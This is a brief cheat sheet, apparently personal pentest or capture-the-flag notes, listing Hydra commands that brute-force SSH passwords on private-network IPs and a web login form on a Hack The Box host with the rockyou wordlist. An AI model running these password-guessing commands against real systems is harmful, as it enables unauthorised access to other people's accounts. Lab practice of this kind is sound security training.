# Hydra bruteforce SSH password

```
hydra -t 4 -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.232.135

hydra –l aeolus –P /usr/share/wordlists/rockyou.txt 192.168.1.102 ssh
```

## Bruteforce WEB FORM 

```
hydra admin.cronos.htb http-post-form "/index.php:username=^USER^&password=^PASS^:F-Your Login Name or Password is invalid" -l admin -P /usr/share/john/password.lst -vV -f 
```



